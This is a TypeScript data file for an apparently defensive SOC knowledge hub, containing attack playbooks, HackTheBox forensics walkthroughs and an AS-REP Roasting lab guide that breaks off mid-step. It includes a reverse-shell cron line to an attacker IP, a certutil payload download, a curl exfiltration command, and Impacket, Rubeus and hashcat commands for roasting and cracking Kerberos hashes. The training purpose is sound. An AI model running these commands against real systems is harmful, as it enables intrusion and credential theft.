// Knowledge Hub data — Attack summaries, mitigations, response playbooks, and forensics blogs
// Curated by Ahmed Tareq for SOCMind
import forensicsMemoryImg from '@/assets/forensics-memory.jpg';
import forensicsLogsImg from '@/assets/forensics-logs.jpg';
import forensicsNetworkImg from '@/assets/forensics-network.jpg';
import adAsrepHero from '@/assets/ad-asrep-hero.jpg';
import adAsrepFlow from '@/assets/ad-asrep-flow.jpg';
import adAsrepCrack from '@/assets/ad-asrep-crack.jpg';
import adKerberoastHero from '@/assets/ad-kerberoast-hero.jpg';
import adKerberoastFlow from '@/assets/ad-kerberoast-flow.jpg';
import adSilverTicketHero from '@/assets/ad-silverticket-hero.jpg';
import adSilverTicketFlow from '@/assets/ad-silverticket-flow.jpg';
import adGoldenTicketHero from '@/assets/ad-goldenticket-hero.jpg';
import adGoldenTicketFlow from '@/assets/ad-goldenticket-flow.jpg';

export interface MitreTechnique {
  id: string;
  name: string;
  url: string;
}

export interface AttackEntry {
  id: string;
  name: string;
  category: 'Initial Access' | 'Execution' | 'Persistence' | 'Credential Access' | 'Lateral Movement' | 'Exfiltration' | 'Impact';
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  summary: string;
  howItWorks: string[];
  detection: string[];
  mitigation: string[];
  response: string[];
  mitre: MitreTechnique[];
  tools: string[];
}

export interface ForensicsBlog {
  id: string;
  slug: string;
  title: string;
  scenario: string;
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Insane';
  category: 'Memory Forensics' | 'Disk Forensics' | 'Network Forensics' | 'Log Analysis' | 'Malware Analysis';
  publishedAt: string;
  author: string;
  readingTime: number;
  labProvider: 'HackTheBox' | 'TryHackMe';
  labUrl: string;
  labName: string;
  coverImage: string;
  overview: string;
  investigationSteps: {
    title: string;
    description: string;
    commands?: string[];
    findings?: string;
  }[];
  ttps: {
    tactic: string;
    technique: string;
    techniqueId: string;
    description: string;
  }[];
  iocs: { type: string; value: string; context: string }[];
  conclusion: string;
  lessonsLearned: string[];
}

// =================== ATTACK PLAYBOOKS ===================

export const attackEntries: AttackEntry[] = [
  {
    id: 'phishing-credential-harvest',
    name: 'Phishing — Credential Harvesting',
    category: 'Initial Access',
    severity: 'High',
    summary:
      'Attackers send a crafted email with a fake login portal (Microsoft 365, Okta, banking) to steal user credentials and pivot into the corporate environment.',
    howItWorks: [
      'Threat actor registers a typo-squatted domain (e.g. micros0ft-login.com).',
      'Email is delivered with a sense of urgency (password expiry, invoice, HR notice).',
      'Victim clicks the link → fake portal mirrors the real login page.',
      'Credentials are POSTed to the attacker server and victim is redirected to the legitimate portal.',
      'Attacker uses harvested creds — often paired with MFA fatigue — to log into the real service.',
    ],
    detection: [
      'Email gateway alerts on newly registered look-alike domains.',
      'Sign-ins from impossible-travel locations or new ASNs.',
      'Multiple failed MFA push notifications followed by a successful one.',
      'User-Agent mismatch between historical and current sessions.',
    ],
    mitigation: [
      'Enforce phishing-resistant MFA (FIDO2 / WebAuthn).',
      'Enable Conditional Access with device compliance + named locations.',
      'Block newly observed domains at the proxy / DNS layer.',
      'Run quarterly phishing simulations and just-in-time training.',
      'Adopt DMARC reject + DKIM + SPF on every owned domain.',
    ],
    response: [
      'Revoke all active sessions for the impacted identity (Azure AD: Revoke-AzureADUserAllRefreshToken).',
      'Force password reset and re-enroll MFA factors.',
      'Hunt for OAuth app consent grants created in the past 30 days.',
      'Pull mailbox audit logs — look for inbox rules forwarding externally.',
      'Block sender domain at the secure email gateway and add hash to the IOC list.',
    ],
    mitre: [
      { id: 'T1566.002', name: 'Spearphishing Link', url: 'https://attack.mitre.org/techniques/T1566/002/' },
      { id: 'T1078', name: 'Valid Accounts', url: 'https://attack.mitre.org/techniques/T1078/' },
      { id: 'T1556.006', name: 'Multi-Factor Authentication', url: 'https://attack.mitre.org/techniques/T1556/006/' },
    ],
    tools: ['Evilginx2', 'Gophish', 'Modlishka'],
  },
  {
    id: 'ransomware-double-extortion',
    name: 'Ransomware — Double Extortion',
    category: 'Impact',
    severity: 'Critical',
    summary:
      'Modern ransomware crews exfiltrate data before encryption, then threaten to leak it on shame sites if the ransom is unpaid.',
    howItWorks: [
      'Initial access via VPN appliance vuln, RDP brute force, or phishing loader.',
      'Cobalt Strike / Sliver beacon deployed for persistence and C2.',
      'Active Directory enumeration with BloodHound / SharpHound.',
      'Privilege escalation to Domain Admin — typically via Kerberoasting or unpatched PrintNightmare.',
      'Data staged and exfiltrated via Rclone / MEGAsync to attacker cloud.',
      'Ransomware binary pushed via PsExec / GPO to all reachable hosts.',
    ],
    detection: [
      'Volume Shadow Copy deletion (vssadmin delete shadows /all /quiet).',
      'Mass file rename events on file servers (entropy spike).',
      'Outbound traffic to MEGA, Rclone user-agents, or unusual cloud storage.',
      'New service installations with random names across many hosts in a short window.',
    ],
    mitigation: [
      'Immutable, offline backups tested via quarterly restore drills.',
      'Network segmentation between user VLANs and crown-jewel servers.',
      'Application allow-listing on critical servers (WDAC / AppLocker).',
      'Disable SMBv1, restrict RDP to jump hosts only.',
      'Tier-0 admin model — separate accounts for DA, no email/web on those workstations.',
    ],
    response: [
      'Isolate infected hosts at the switch port — do NOT power off (preserve memory).',
      'Acquire memory + triage image of patient zero before remediation.',
      'Reset krbtgt twice (10-hour gap) to invalidate Golden Tickets.',
      'Engage legal, insurance, and law enforcement (FBI IC3 / CERT) before any ransom discussion.',
      'Rebuild from gold images — never decrypt-and-trust an infected host.',
    ],
    mitre: [
      { id: 'T1486', name: 'Data Encrypted for Impact', url: 'https://attack.mitre.org/techniques/T1486/' },
      { id: 'T1490', name: 'Inhibit System Recovery', url: 'https://attack.mitre.org/techniques/T1490/' },
      { id: 'T1567.002', name: 'Exfil to Cloud Storage', url: 'https://attack.mitre.org/techniques/T1567/002/' },
      { id: 'T1003', name: 'OS Credential Dumping', url: 'https://attack.mitre.org/techniques/T1003/' },
    ],
    tools: ['LockBit', 'BlackCat / ALPHV', 'Cobalt Strike', 'Mimikatz', 'Rclone'],
  },
  {
    id: 'lateral-movement-pth',
    name: 'Lateral Movement — Pass-the-Hash',
    category: 'Lateral Movement',
    severity: 'High',
    summary:
      'After dumping NTLM hashes from LSASS, an attacker authenticates to other Windows hosts without ever knowing the cleartext password.',
    howItWorks: [
      'Attacker compromises a workstation and elevates to local admin.',
      'Mimikatz / pypykatz dumps NTLM hashes from LSASS memory.',
      'Hashes are reused with tools like Impacket\'s wmiexec.py / smbexec.py.',
      'Attacker pivots laterally until a Domain Admin hash is found.',
      'Full domain compromise enables Golden Ticket creation.',
    ],
    detection: [
      'Event ID 4624 Logon Type 3 with NTLM authentication from a workstation.',
      'LSASS process access from non-standard binaries (Sysmon Event ID 10).',
      'Suspicious outbound SMB to many hosts in a short window.',
      'Hash reuse detected via honey-account tripwires.',
    ],
    mitigation: [
      'Enable Credential Guard (VBS) on all Windows 10/11 endpoints.',
      'Restrict local admin via LAPS — unique password per host.',
      'Block NTLM where possible; enforce Kerberos + AES.',
      'Tier-0/1/2 admin separation — never log a DA into a workstation.',
      'Protected Users group + "Account is sensitive and cannot be delegated" on privileged accounts.',
    ],
    response: [
      'Force-reset every account that logged into the compromised host.',
      'Reset krbtgt twice if any DA hash may have been exposed.',
      'Pull Sysmon + 4624/4625 logs for a full lateral-movement timeline.',
      'Re-image compromised hosts — don\'t trust AV cleanup of LSASS injection.',
    ],
    mitre: [
      { id: 'T1550.002', name: 'Pass the Hash', url: 'https://attack.mitre.org/techniques/T1550/002/' },
      { id: 'T1003.001', name: 'LSASS Memory', url: 'https://attack.mitre.org/techniques/T1003/001/' },
      { id: 'T1021.002', name: 'SMB / Admin Shares', url: 'https://attack.mitre.org/techniques/T1021/002/' },
    ],
    tools: ['Mimikatz', 'Impacket', 'CrackMapExec', 'Rubeus'],
  },
  {
    id: 'web-shell-rce',
    name: 'Web Shell via RCE',
    category: 'Execution',
    severity: 'Critical',
    summary:
      'An exposed web app vulnerability (deserialization, file upload, SSTI) is abused to drop a persistent web shell on the server.',
    howItWorks: [
      'Attacker scans for known CVEs (Log4Shell, ProxyShell, Confluence OGNL).',
      'PoC exploit returns code execution as the web service user.',
      'Small in-memory loader writes a .aspx / .jsp / .php shell to the web root.',
      'Shell provides a long-term backdoor surviving reboots.',
      'Attacker uses the shell to enumerate, dump creds, and pivot inward.',
    ],
    detection: [
      'New executable files in web-server document roots.',
      'Web server process spawning cmd.exe / bash / powershell.exe.',
      'Outbound connections originating from w3wp.exe or httpd.',
      'High entropy / obfuscated PHP/ASPX files (eval, base64_decode chains).',
    ],
    mitigation: [
      'Patch internet-facing apps within 72h of CVE disclosure.',
      'WAF with virtual-patch signatures for known web-app CVEs.',
      'Run web servers as least-privileged user, read-only doc root.',
      'File integrity monitoring on web roots (Tripwire / Wazuh FIM).',
    ],
    response: [
      'Snapshot the host (disk + memory) before any cleanup.',
      'Pull IIS / Apache / Nginx access logs for the past 90 days — look for the dropper request.',
      'Rotate all secrets stored on / accessible from the web host.',
      'Rebuild the web tier from a golden image; do not just delete the shell.',
    ],
    mitre: [
      { id: 'T1505.003', name: 'Web Shell', url: 'https://attack.mitre.org/techniques/T1505/003/' },
      { id: 'T1190', name: 'Exploit Public-Facing App', url: 'https://attack.mitre.org/techniques/T1190/' },
      { id: 'T1059', name: 'Command & Scripting Interpreter', url: 'https://attack.mitre.org/techniques/T1059/' },
    ],
    tools: ['China Chopper', 'Behinder', 'AntSword', 'Metasploit'],
  },
  {
    id: 'living-off-the-land',
    name: 'Living-off-the-Land (LOLBins)',
    category: 'Execution',
    severity: 'Medium',
    summary:
      'Attackers use signed Microsoft binaries (certutil, mshta, regsvr32, rundll32) to download payloads and evade traditional AV signatures.',
    howItWorks: [
      'Initial macro or LNK launches a LOLBin instead of a custom EXE.',
      'certutil -urlcache -split -f http://attacker/payload.bin downloads the second stage.',
      'mshta or rundll32 executes the payload, inheriting trust of the Microsoft binary.',
      'EDR signatures often whitelist these processes — alert volume is low.',
    ],
    detection: [
      'certutil with -urlcache or -decode arguments.',
      'mshta.exe with HTTP URL arguments.',
      'rundll32.exe spawning child processes from %TEMP%.',
      'PowerShell with -enc / -nop / -w hidden flags.',
    ],
    mitigation: [
      'Block known-bad LOLBin command-line patterns via ASR rules.',
      'Constrained Language Mode for PowerShell.',
      'AppLocker / WDAC scripts policy.',
      'Monitor parent-child process chains via Sysmon Event ID 1.',
    ],
    response: [
      'Capture command-line history and Sysmon events for the impacted host.',
      'Trace the originating document / email — block sender + hash.',
      'Hunt the binary hash across the entire EDR fleet.',
    ],
    mitre: [
      { id: 'T1218', name: 'Signed Binary Proxy Execution', url: 'https://attack.mitre.org/techniques/T1218/' },
      { id: 'T1059.001', name: 'PowerShell', url: 'https://attack.mitre.org/techniques/T1059/001/' },
      { id: 'T1105', name: 'Ingress Tool Transfer', url: 'https://attack.mitre.org/techniques/T1105/' },
    ],
    tools: ['LOLBAS Project', 'Atomic Red Team', 'Covenant'],
  },
  {
    id: 'dns-tunneling-exfil',
    name: 'DNS Tunneling — Data Exfiltration',
    category: 'Exfiltration',
    severity: 'High',
    summary:
      'Sensitive data is base64-encoded and embedded into DNS queries, bypassing proxies that don\'t inspect port 53.',
    howItWorks: [
      'Attacker controls authoritative DNS for a domain (evil.com).',
      'Implant chunks data into subdomain labels: <chunk1>.evil.com, <chunk2>.evil.com.',
      'Each query reaches the attacker\'s DNS server, reassembling the data.',
      'Most networks allow outbound DNS unconditionally — perfect covert channel.',
    ],
    detection: [
      'Abnormally long DNS query lengths (>50 chars in a single label).',
      'High query volume to a single second-level domain.',
      'High entropy / random-looking subdomains.',
      'TXT record queries from non-mail systems.',
    ],
    mitigation: [
      'Force all internal DNS through inspecting resolvers (e.g. Cisco Umbrella, Cloudflare Gateway).',
      'Block direct outbound UDP/53 from endpoints.',
      'DNS query logging + analytics (passive DNS).',
      'Limit DNS query size and rate per host.',
    ],
    response: [
      'Sinkhole the malicious second-level domain at the resolver.',
      'Identify all hosts that queried the domain in the last 90 days.',
      'Capture full PCAP from suspect host for offline analysis.',
      'Treat the host as compromised — rotate any secrets it could access.',
    ],
    mitre: [
      { id: 'T1071.004', name: 'Application Layer Protocol: DNS', url: 'https://attack.mitre.org/techniques/T1071/004/' },
      { id: 'T1048', name: 'Exfil Over Alt Protocol', url: 'https://attack.mitre.org/techniques/T1048/' },
    ],
    tools: ['DNSCat2', 'Iodine', 'dnsteal'],
  },
];

// =================== FORENSICS BLOGS ===================

export const forensicsBlogs: ForensicsBlog[] = [
  {
    id: 'blog-htb-perfection',
    slug: 'htb-perfection-memory-forensics',
    title: 'Investigating an Insider Data Theft — HTB "Perfection" Walkthrough',
    scenario:
      'A finance employee was suspected of leaking quarterly revenue figures to a competitor. Their workstation memory was acquired right before they left the office. Our job: prove or disprove the theft using only the memory image.',
    difficulty: 'Medium',
    category: 'Memory Forensics',
    publishedAt: '2025-04-12',
    author: 'Ahmed Tareq',
    readingTime: 9,
    labProvider: 'HackTheBox',
    labName: 'Perfection — Sherlocks',
    labUrl: 'https://app.hackthebox.com/sherlocks/Perfection',
    coverImage: forensicsMemoryImg,
    overview:
      'This Sherlock simulates a real DLP investigation. We are handed a Windows 10 memory dump (.mem) and a single question: "Did the user exfiltrate the Q3 revenue spreadsheet, and if so, how?" I worked the case with Volatility 3, Bulk Extractor, and a touch of strings-fu.',
    investigationSteps: [
      {
        title: 'Step 1 — Profile identification',
        description:
          'Volatility 3 auto-profiles modern Windows builds. Started with windows.info to confirm OS build and KDBG signature.',
        commands: ['vol -f memory.mem windows.info'],
        findings: 'Windows 10 22H2, build 19045 — confirmed modern Win10 profile, no manual symbol shimming required.',
      },
      {
        title: 'Step 2 — Process tree triage',
        description:
          'pstree gives the full parent-child chain. I was hunting for cloud-storage clients, terminals, and anything spawned by Office.',
        commands: ['vol -f memory.mem windows.pstree'],
        findings:
          'Found EXCEL.EXE → cmd.exe → curl.exe — a strong red flag. Office should never spawn cmd, let alone curl, in a finance workstation.',
      },
      {
        title: 'Step 3 — Reconstructing the curl command',
        description:
          'cmdline reveals the exact arguments passed to curl, including the destination URL and the file uploaded.',
        commands: ['vol -f memory.mem windows.cmdline | grep -i curl'],
        findings:
          'curl -F "file=@C:\\Users\\jdoe\\Documents\\Q3_Revenue.xlsx" https://transfer[.]sh/upload — direct evidence of exfiltration.',
      },
      {
        title: 'Step 4 — Network artifacts',
        description:
          'netscan correlates the curl process with the actual TCP session at the time of acquisition.',
        commands: ['vol -f memory.mem windows.netscan'],
        findings:
          'Established session from PID 4812 (curl.exe) → 144.76.136.153:443 — IP belongs to transfer.sh. Timestamps line up with the cmdline.',
      },
      {
        title: 'Step 5 — Carving the spreadsheet',
        description:
          'Bulk Extractor + foremost on the raw memory pulled fragments of the Q3 spreadsheet, proving the file was open in memory at exfil time.',
        commands: ['bulk_extractor -o out memory.mem', 'foremost -t xlsx -i memory.mem -o carved/'],
        findings: 'Recovered partial XLSX OLE header containing the string "Q3 Revenue Forecast — Confidential".',
      },
    ],
    ttps: [
      {
        tactic: 'Collection',
        technique: 'Data from Local System',
        techniqueId: 'T1005',
        description: 'User accessed the Q3 spreadsheet from a local Documents folder.',
      },
      {
        tactic: 'Exfiltration',
        technique: 'Exfiltration Over Web Service',
        techniqueId: 'T1567.002',
        description: 'transfer.sh used as a free anonymous file-drop service.',
      },
      {
        tactic: 'Execution',
        technique: 'Command and Scripting Interpreter — Windows Command Shell',
        techniqueId: 'T1059.003',
        description: 'cmd.exe spawned by Excel via a malicious macro embedded in a "review" workbook.',
      },
    ],
    iocs: [
      { type: 'IPv4', value: '144.76.136.153', context: 'transfer.sh upload endpoint' },
      { type: 'Domain', value: 'transfer.sh', context: 'Exfiltration destination' },
      { type: 'Filename', value: 'Q3_Revenue.xlsx', context: 'Exfiltrated asset' },
      { type: 'Process Chain', value: 'EXCEL.EXE → cmd.exe → curl.exe', context: 'Anomalous parent-child' },
    ],
    conclusion:
      'Memory forensics gave us a complete, defensible timeline within 30 minutes — process tree, command line, network session, and a carved fragment of the stolen file. The user was confronted with the artifacts and admitted the theft. Disk forensics later corroborated the macro source.',
    lessonsLearned: [
      'Never let Office spawn shell interpreters — block via ASR rule "Block Office apps from creating child processes".',
      'Block known anonymous file-share services at the proxy.',
      'Acquire memory before disk in insider cases — volatile artifacts are the most damning.',
    ],
  },
  {
    id: 'blog-htb-brutus',
    slug: 'htb-brutus-log-analysis',
    title: 'Cracking an SSH Brute-Force Campaign — HTB "Brutus" Walkthrough',
    scenario:
      'A Linux jump host showed a suspicious spike in CPU. The SOC pulled auth.log, wtmp, btmp, and bash history. We must reconstruct the attacker\'s timeline: brute-force window, the cracked account, and any post-compromise persistence.',
    difficulty: 'Easy',
    category: 'Log Analysis',
    publishedAt: '2025-03-28',
    author: 'Ahmed Tareq',
    readingTime: 7,
    labProvider: 'HackTheBox',
    labName: 'Brutus — Sherlocks',
    labUrl: 'https://app.hackthebox.com/sherlocks/Brutus',
    coverImage: forensicsLogsImg,
    overview:
      'A pure log-analysis Sherlock — no binaries, no memory, just text files. The lesson: 90% of intrusions can be reconstructed from auth.log if you know what to grep for.',
    investigationSteps: [
      {
        title: 'Step 1 — Establishing the brute-force window',
        description:
          'Counted "Failed password" entries per minute to find the attack burst.',
        commands: ['grep "Failed password" auth.log | awk \'{print $1, $2, $3}\' | uniq -c | sort -rn | head'],
        findings: '312 failed attempts between 04:13 and 04:19 UTC, all targeting user "root" from 65.2.161.68.',
      },
      {
        title: 'Step 2 — Identifying the successful login',
        description:
          'Filtered for "Accepted" entries within the same window from the same source IP.',
        commands: ['grep "Accepted" auth.log | grep "65.2.161.68"'],
        findings: 'Accepted password for root from 65.2.161.68 port 41420 — 04:19:42 UTC. The attacker burned ~6 minutes.',
      },
      {
        title: 'Step 3 — Mapping the session to wtmp',
        description:
          'last -f wtmp confirmed the live shell session and its duration.',
        commands: ['last -f wtmp -F'],
        findings: 'root pts/1 65.2.161.68 — Mar 6 04:19 still logged in (08:42 duration).',
      },
      {
        title: 'Step 4 — Persistence hunting',
        description:
          'Compared bash history, /etc/passwd, /etc/shadow, and crontab against the attack window.',
        commands: ['stat /etc/passwd /etc/shadow', 'cat /var/spool/cron/*', 'cat ~root/.bash_history'],
        findings:
          '/etc/passwd modified at 04:21:33. New user "cmnatic" added with UID 0. A reverse-shell cron entry runs every 5 minutes.',
      },
      {
        title: 'Step 5 — Eviction recommendations',
        description:
          'Documented every artifact for the IR ticket and proposed eviction steps.',
        findings:
          'Disable password auth on SSH, remove cmnatic, kill the cron, rotate root keys, and rebuild — UID 0 backdoor cannot be trusted.',
      },
    ],
    ttps: [
      {
        tactic: 'Credential Access',
        technique: 'Brute Force — Password Guessing',
        techniqueId: 'T1110.001',
        description: '312 failed root logins in 6 minutes from a single source IP.',
      },
      {
        tactic: 'Persistence',
        technique: 'Create Account — Local',
        techniqueId: 'T1136.001',
        description: 'Backdoor account "cmnatic" added to /etc/passwd with UID 0.',
      },
      {
        tactic: 'Persistence',
        technique: 'Scheduled Task/Job — Cron',
        techniqueId: 'T1053.003',
        description: 'Reverse-shell cron entry executing every 5 minutes.',
      },
    ],
    iocs: [
      { type: 'IPv4', value: '65.2.161.68', context: 'Brute-force + interactive C2' },
      { type: 'Username', value: 'cmnatic', context: 'Backdoor account UID 0' },
      { type: 'Cron', value: '*/5 * * * * /bin/bash -i >& /dev/tcp/65.2.161.68/4444 0>&1', context: 'Persistence' },
    ],
    conclusion:
      'Brutus reinforced the basics: never expose SSH password auth to the public internet, monitor auth.log for failure spikes, and treat any new UID-0 account as catastrophic. Total investigation time: 22 minutes from log handoff to written report.',
    lessonsLearned: [
      'Disable password authentication on SSH; enforce keys + MFA.',
      'Fail2Ban / CrowdSec is a free, effective brute-force mitigation.',
      'Forward auth.log to a central SIEM — do not rely on the host that was attacked.',
    ],
  },
  {
    id: 'blog-htb-tracer',
    slug: 'htb-tracer-network-forensics',
    title: 'Tracing a C2 Beacon Through PCAP — HTB "Tracer" Walkthrough',
    scenario:
      'An EDR alert flagged abnormal beacon-like traffic from a developer workstation. The SOC captured a 12-minute PCAP. Our mission: identify the C2 framework, decode the beacon, and pull any exfiltrated data.',
    difficulty: 'Hard',
    category: 'Network Forensics',
    publishedAt: '2025-02-19',
    author: 'Ahmed Tareq',
    readingTime: 11,
    labProvider: 'HackTheBox',
    labName: 'Tracer — Sherlocks',
    labUrl: 'https://app.hackthebox.com/sherlocks/Tracer',
    coverImage: forensicsNetworkImg,
    overview:
      'A network-only Sherlock that mimics a real Cobalt Strike investigation. We worked the PCAP with Wireshark, Zeek, RITA, and a custom Python decoder for the obfuscated metadata.',
    investigationSteps: [
      {
        title: 'Step 1 — Top talkers and beacon detection',
        description:
          'Used RITA against the Zeek logs to find low-and-slow connections — the classic beacon footprint.',
        commands: ['zeek -r capture.pcap', 'rita import -i case zeek-logs/', 'rita show-beacons case'],
        findings:
          'Score 0.94 beacon: 10.10.10.42 → 167.71.207.89:443 — 117 connections, 60s ± 2s jitter — textbook Cobalt Strike default profile.',
      },
      {
        title: 'Step 2 — Confirming the C2 framework',
        description:
          'Pulled the JA3 / JA3S TLS fingerprints and compared against the Salesforce SSL Blacklist.',
        commands: ['tshark -r capture.pcap -Y "tls.handshake.type==1" -T fields -e tls.handshake.ja3'],
        findings: 'JA3 a0e9f5d64349fb13191bc491f9c23c79 — known Cobalt Strike Java client fingerprint.',
      },
      {
        title: 'Step 3 — Decoding the staged payload',
        description:
          'The first GET to /jquery-3.3.1.min.js returned an oversized JS file with appended encrypted shellcode (Malleable C2 jQuery profile).',
        commands: ['tshark -r capture.pcap -Y "http.request.uri==\\"/jquery-3.3.1.min.js\\"" --export-objects http,extracted/'],
        findings: 'Extracted 245KB stager — XOR key 0x69, decoded to Cobalt Strike beacon DLL (SHA256 a1b2…).',
      },
      {
        title: 'Step 4 — Recovering exfiltrated data',
        description:
          'Beacon HTTP POSTs to /submit.php carried base64-encoded metadata blocks. Wrote a 20-line Python script to decode them.',
        findings:
          'Decoded blocks revealed `whoami` output (corp\\jdoe), AD enumeration (net group "Domain Admins"), and a 4MB ZIP containing the user\'s SSH keys.',
      },
      {
        title: 'Step 5 — Building the IOC pack',
        description:
          'Documented C2 IP, JA3, URIs, XOR key, and beacon hash for distribution to the EDR + firewall teams.',
      },
    ],
    ttps: [
      {
        tactic: 'Command and Control',
        technique: 'Application Layer Protocol — Web Protocols',
        techniqueId: 'T1071.001',
        description: 'Cobalt Strike Malleable C2 over HTTPS using a jQuery profile.',
      },
      {
        tactic: 'Defense Evasion',
        technique: 'Obfuscated Files or Information',
        techniqueId: 'T1027',
        description: 'Single-byte XOR (0x69) to obscure stager and exfil blocks.',
      },
      {
        tactic: 'Discovery',
        technique: 'Domain Trust Discovery',
        techniqueId: 'T1482',
        description: 'net group "Domain Admins" enumeration via beacon.',
      },
      {
        tactic: 'Exfiltration',
        technique: 'Exfiltration Over C2 Channel',
        techniqueId: 'T1041',
        description: 'SSH keys and recon data POSTed back over the beaconing HTTPS session.',
      },
    ],
    iocs: [
      { type: 'IPv4', value: '167.71.207.89', context: 'Cobalt Strike Team Server' },
      { type: 'JA3', value: 'a0e9f5d64349fb13191bc491f9c23c79', context: 'CS Java client fingerprint' },
      { type: 'URI', value: '/jquery-3.3.1.min.js', context: 'Stager hosted on team server' },
      { type: 'URI', value: '/submit.php', context: 'Exfiltration endpoint' },
      { type: 'Crypto', value: 'XOR key 0x69', context: 'Stager + exfil obfuscation' },
    ],
    conclusion:
      'Tracer is a beautiful end-to-end network case: beacon detection (RITA) → framework attribution (JA3) → payload reversal (XOR) → exfil reconstruction (Python). Every defender should run this lab once a year — the muscle memory matters when a real beacon shows up at 3 AM.',
    lessonsLearned: [
      'Always feed PCAP into Zeek + RITA — beaconing is invisible to the human eye.',
      'JA3 fingerprints are gold for catching custom C2 frameworks.',
      'TLS inspection on egress is non-negotiable for high-value networks.',
    ],
  },
];

// =================== AD ATTACK ROOMS ===================

export interface AdAttackImage {
  src: string;
  caption: string;
}

export interface AdAttackStep {
  title: string;
  description: string;
  commands?: string[];
  image?: AdAttackImage;
  output?: string;
}

export interface CommandExplanation {
  command: string;
  purpose: string;
  breakdown: { flag: string; meaning: string }[];
  why: string;
}

export interface ToolExplanation {
  name: string;
  category: string;
  purpose: string;
  why: string;
  link?: string;
}

export interface SocDetectionItem {
  title: string;
  description: string;
  eventIds?: string[];
  dataSource?: string;
  query?: string;
  queryLanguage?: 'KQL' | 'SPL' | 'SQL' | 'EQL';
  severity?: 'Low' | 'Medium' | 'High' | 'Critical';
}

export interface AdAttackRoom {
  id: string;
  slug: string;
  name: string;
  shortName: string;
  category: 'Credential Access' | 'Privilege Escalation' | 'Lateral Movement' | 'Persistence' | 'Defense Evasion';
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Insane';
  publishedAt: string;
  author: string;
  readingTime: number;
  labProvider: 'HackTheBox' | 'TryHackMe';
  labName: string;
  labUrl: string;
  coverImage: string;
  summary: string;
  prerequisites: string[];
  attackFlow: string[];
  walkthrough: AdAttackStep[];
  commandsCheatsheet: { title: string; command: string; note?: string }[];
  commandExplanations: CommandExplanation[];
  toolsExplained: ToolExplanation[];
  enumerationDetection: SocDetectionItem[];
  socDetection: SocDetectionItem[];
  detection: string[];
  mitigation: string[];
  remediation: string[];
  mitre: MitreTechnique[];
  tools: string[];
  references: { title: string; url: string }[];
}

export const adAttackRooms: AdAttackRoom[] = [
  {
    id: 'ad-asrep-roasting',
    slug: 'ad-asrep-roasting',
    name: 'AS-REP Roasting — Active Directory Credential Access',
    shortName: 'AS-REP Roasting',
    category: 'Credential Access',
    severity: 'High',
    difficulty: 'Medium',
    publishedAt: '2025-05-01',
    author: 'Ahmed Tareq',
    readingTime: 12,
    labProvider: 'HackTheBox',
    labName: 'AS-REP Roasting — HTB Academy',
    labUrl: 'https://academy.hackthebox.com/module/details/143',
    coverImage: adAsrepHero,
    summary:
      'AS-REP Roasting abuses Active Directory accounts that have Kerberos pre-authentication disabled. The KDC will hand out an AS-REP message containing material encrypted with the user\'s NT hash to anyone who asks — letting an attacker crack the password offline with hashcat or john, with zero traffic to the target.',
    prerequisites: [
      'Network reachability to a domain controller on TCP/UDP 88 (Kerberos).',
      'A list of valid AD usernames (no creds required).',
      'Impacket installed (GetNPUsers.py) or Rubeus on a compromised Windows host.',
      'A wordlist (rockyou.txt) and hashcat / john for offline cracking.',
    ],
    attackFlow: [
      'Enumerate AD users (LDAP, RPC, kerbrute, or a captured user list).',
      'Send AS-REQ packets without pre-authentication for each user.',
      'KDC returns an AS-REP for any account flagged DONT_REQ_PREAUTH (UAC bit 0x400000).',
      'Extract the encrypted timestamp blob — format $krb5asrep$23$user@DOMAIN:hash.',
      'Crack offline with hashcat -m 18200 to recover the cleartext password.',
      'Authenticate as the user and pivot deeper into the domain.',
    ],
    walkthrough: [
      {
        title: 'Step 1 — Enumerate domain users',
        description:
          'Before AS-REP Roasting, we need a list of valid usernames. In the HTB room we already have low-priv credentials, so we use Impacket\'s GetADUsers.py to pull every account from the directory.',
        commands: [
          'GetADUsers.py -all -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!',
        ],
        output:
          'sAMAccountName  Email  PasswordLastSet  LastLogon\nadministrator   -      2022-09-29 ...  2024-01-12\nhtb-student     -      2022-09-29 ...  2024-01-12\nbsmith          -      2022-09-29 ...  never logged on\n... (truncated)',
      },
      {
        title: 'Step 2 — Understand the Kerberos pre-auth check',
        description:
          'A normal AS-REQ ships an encrypted timestamp (PA-ENC-TIMESTAMP) proving the client knows the password. If the account has "Do not require Kerberos preauthentication" set, the KDC skips that check and replies with an AS-REP whose encrypted portion is derived from the user\'s NT hash — a perfect offline cracking target.',
        image: { src: adAsrepFlow, caption: 'Kerberos AS-REQ vs AS-REP — pre-auth disabled = roastable.' },
      },
      {
        title: 'Step 3 — Roast all accounts at once (Linux / Impacket)',
        description:
          'GetNPUsers.py with -request asks the KDC for AS-REPs for every account that allows it. With a username list we can do this fully unauthenticated.',
        commands: [
          'GetNPUsers.py -no-pass -usersfile valid_users.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/',
          'GetNPUsers.py -request -outputfile asrep_hashes.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!',
        ],
        output:
          '[*] Getting TGT for mmorgan\n$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:b24f...$3a78f...c2\n[-] User bsmith doesn\'t have UF_DONT_REQUIRE_PREAUTH set',
      },
      {
        title: 'Step 4 — Roast from a Windows foothold (Rubeus)',
        description:
          'When we already control a domain-joined host, Rubeus does the same thing natively over Kerberos with no Impacket dependency.',
        commands: [
          'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt',
          'Rubeus.exe asreproast /user:mmorgan /format:hashcat',
        ],
      },
      {
        title: 'Step 5 — Crack the AS-REP hash offline',
        description:
          'Mode 18200 in hashcat targets the etype 23 (RC4-HMAC) AS-REP blob. With rockyou.txt the weak passwords fall in seconds.',
        commands: [
          'hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force',
          'john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt',
        ],
        image: { src: adAsrepCrack, caption: 'hashcat -m 18200 cracking $krb5asrep$23$ blob with rockyou.' },
        output:
          '$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:b24f…$3a78f…c2:Welcome1',
      },
      {
        title: 'Step 6 — Validate the recovered credential',
        description:
          'Confirm the cracked password actually authenticates and check what the user can reach. CrackMapExec or netexec is perfect for this sweep.',
        commands: [
